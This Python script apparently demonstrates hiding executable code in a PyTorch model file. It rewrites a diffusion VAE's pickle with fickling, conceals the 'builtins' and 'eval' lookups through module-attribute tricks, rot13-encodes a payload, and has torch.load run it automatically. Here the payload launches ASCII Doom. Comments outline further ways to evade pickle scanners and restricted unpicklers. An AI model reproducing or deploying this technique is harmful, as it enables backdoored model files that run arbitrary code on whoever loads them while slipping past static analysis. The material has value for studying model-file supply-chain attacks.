# pylint: disable=redefined-builtin,reimported,redefined-outer-name,unspecified-encoding
import io
import os
import sys
import pickle
import pickletools as pt
import tarfile
import torch

from fickling import pickle as p
from fickling.pickle import Pickled

from spiro import PlaceholderVariables, find_main_pickle
from rememoize import postprocess

if not (os.path.exists("doom/DOOM1.WAD") and os.path.exists("doom/doom_ascii")):
    print("go download doom to ./doom (and unzip them)")
    print("https://www.doomworld.com/3ddownloads/ports/shareware_doom_iwad.zip")
    print(
        "https://github.com/wojciech-graj/doom-ascii/releases/download/v0.1.1/doom_ascii_linux_v0_1_1.zip"
    )
    sys.exit(1)


def get_doom_binbytes() -> p.BinBytes:
    doom_buf = io.BytesIO()
    doom_ball = tarfile.open(fileobj=doom_buf, mode="w:gz")
    os.chdir("doom")
    # https://www.doomworld.com/3ddownloads/ports/shareware_doom_iwad.zip
    doom_ball.add("DOOM1.WAD")
    # https://github.com/wojciech-graj/doom-ascii/releases/download/v0.1.1/doom_ascii_linux_v0_1_1.zip
    doom_ball.add("doom_ascii")
    print([member.name for member in doom_ball.getmembers()])
    os.chdir("..")
    print(os.getcwd())
    doom_ball.close()
    doom_buf.seek(0)
    # proto, binbytes, stop
    doom_binbytes = Pickled.load(pickle.dumps(doom_buf.read()))[1]
    print(doom_buf.tell())
    return doom_binbytes


if len(sys.argv) > 2:
    input_path = sys.argv[1]
    output_path = sys.argv[2]
elif len(sys.argv) > 1:
    input_path = sys.argv[1]
    dir, name = os.path.split(input_path)
    output_path = os.path.join(dir, "evil_" + name)
else:
    input_path = "waifu-diffusion/vae/real_diffusion_pytorch_model.bin"
    output_path = "waifu-diffusion/vae/diffusion_pytorch_model.bin"
print("reading original from", input_path, "writing evil to", output_path)

first_bytes, original_dump, last_bytes = find_main_pickle(input_path)
vae_pickle = Pickled.load(original_dump)

# now we're going to fuck with vae_pickle, then do first_bytes + fucked vae_pickle + last_bytes and hope for the best

memos = PlaceholderVariables()  # count_ops(vae_pickle, p.Memoize))


def set_value(new_value: p.Opcode) -> list[p.Opcode]:
    "_utils.__dict__.update({'_rebuild_tensor': new_value})"
    return [
        memos["_utils"],
        p.EmptyDict(),
        p.Unicode(b"_rebuild_tensor"),
        new_value,
        p.SetItem(),
        p.Build(),
        p.Pop(),
    ]


def get_value(name: p.Opcode = p.Unicode(b"_rebuild_tensor")) -> list[p.Opcode]:
    "pickle._getattribute(torch._utils, '_rebuild_tensor')"
    return [
        p.Unicode(b"torch._utils"),
        name,
        p.StackGlobal(),
    ]


def hidden_unicode(uni: bytes) -> list[p.Opcode]:
    """
    _utils._rebuild_tensor = uni
    from torch._utils import _rebuild_tensor
    return _rebuild_tensor

    the idea is you'd need to execute the assignment and import
    to know what's on the stack
    """
    return set_value(p.Unicode(uni)) + get_value()


# tl;dr
# get an innocous module
# use BUILD to set variables in the module with innocous names
# import the values you want from it
# those values can't be statically analysed


# maybe there's a way to sneakily change the stack?
# make genops think a variable is _rebuild_tensor when it's actually _rebuild_tensor.__class__.__getattribute__ or such?
# the really fun thing would be is if you can find a reference to the unpickler and mutate the stack that way
# ...dup?
# what if we had stackdata with an argument?


rot13 = {97 + i: 97 + (i + 13) % 26 for i in range(26)}
payload_body = open("payload.py").read().translate(rot13)
rot13_payload = (
    '"""' + payload_body + '""".translate({97+i:97+(i+13)%26 for i in range(26)})'
)

exploit = [
    # from torch._utils import _rebuild_tensor as orig_rebuild_tensor
    *get_value(),
    memos.assign("orig_rebuild_tensor"),
    p.Pop(),
    # from torch import _utils
    p.Unicode(b"torch"),
    p.Unicode(b"_utils"),
    p.StackGlobal(),
    memos.assign("_utils"),
    p.Pop(),
    # _utils._rebuild_tensor = "builtins"
    # from torch._utils import _rebuild_tensor as builtins_str
    *hidden_unicode(b"builtins"),
    # _utils._rebuild_tensor = "eval"
    # from torch._utils import _rebuild_tensor as eval_str
    *hidden_unicode(b"eval"),
    # eval = getattr(sys.modules[builtins_str], eval_str)
    # the idea is you'd need to execute those imports and assignments
    # to know what was imported here
    p.StackGlobal(),
    # _utils._rebuild_tensor = orig_rebuild_tensor
    *set_value(memos["orig_rebuild_tensor"]),
    memos.assign("eval"),
    memos["eval"],
    # stack: [eval, eval]
    # un-rot13 payload source
    p.Unicode(rot13_payload.encode()),
    p.TupleOne(),
    p.Reduce(),  # eval(<rot13_payload>.translate(rot13))
    # stack: [eval, plaintext_payload]
    p.TupleOne(),
    p.Reduce(),  # define payload fn, `eval(exec(payload) or payload)`
    get_doom_binbytes(),
    p.TupleOne(),
    p.Reduce(),  # payload(doom_bytes)
    p.Pop(),  # p.Pop(),
]


# __import__("IPython").display.IFrame("https://technillogue.github.io/doom.html", 960, 600)


# you can get fancier with abusing building on modules with stack_global
# to find __getattribute__ first and compose strings that way
# to avoid having scary strings in the pickle

# you could also try to defeat restricted unpicklers that check for 'builtins' at runtime

# abuse_pickle_getattribute = [
#     *get_value(),
#     vars.add(p.Memoize(), "original _rebuild_tensor")
#     p.Unicode(b"torch"),
#     p.Unicode(b"_utils"),
#     p.StackGlobal(),
#     vars.add(p.Memoize(), "_utils"),
#     p.Pop(),
#     # _utils._rebuild_tensor =
#     *set_value(p.Unicode(b"_rebuild_tensor.__class__.__getattribute__")),
#     *get_value(),
#     vars.add(p.Memoize(), "evil_path")
#     p.Pop(),
#     *set_value(p.NewObj()), # _utils._rebuild_tensor = object()
#     *get_value(vars["evil_path"]) # _utils._rebuild_tensor.__class__.__getattribute__
#     vars.add(p.Memoize(), "getattr"), # getattr = object.__getattribute__
#     vars["getattr"],
#     vars["getattr"],
#     p.Unicode(b"__class__"),
#     # stack: [getattr, getattr, getattr, "__class__"]
#     vars.add(p.Memoize(), "__class___str"),
#     p.TupleTwo(),
#     p.Reduce(), # getattr(getattr, "__class__")
#     p.Unicode(b"__module__"),
#     p.TupleTwo(),
#     p.Reduce(), # getattr(getattr(getattr, "__class__"), "__module__") = "builtins"
#     vars.add(p.Memoize(), "builtins_str"),
#     p.Unicode(b"exec"), # could compose this with "builtins".__class__.__replace__("torch", "tor", "exe").replace("h", "")
#     # okay maybe that was a little unnecessary? you could keep going with this and tc to prevent scanning
# ]


# since we're not replacing anything real, let's insert just before STOP

# correct framing
# pickle targets frames being under 64 * 1024

# exploit_length = len(Pickled(exploit).dumps())

# for op in reversed(vae_pickle):
#     if isinstance(op, p.Frame):
#         change_frame_len(op, exploit_length)
#         break

#preliminary_result = postprocess(Pickled(vae_pickle[:2] + exploit + vae_pickle[2:]))
preliminary_result = postprocess(Pickled(vae_pickle[:-1] + exploit + [p.Stop()]), False)
# preliminary_result = vae_pickle

# we fucked with data and position, so have fickling re-parse the pickle
result = Pickled.load(preliminary_result.dumps())


dumped = result.dumps()
f = open(output_path, "wb")
f.write(first_bytes)
f.write(dumped)
f.write(last_bytes)
f.close()


print("loading cool vae")
# note! this launches doom! and waits for it to exit!
# doom is poorly behaved and doesn't clean up the screen
pt.dis(dumped, out=open("vae_dis", "w"))
cool_model = torch.load(output_path)
print(cool_model)
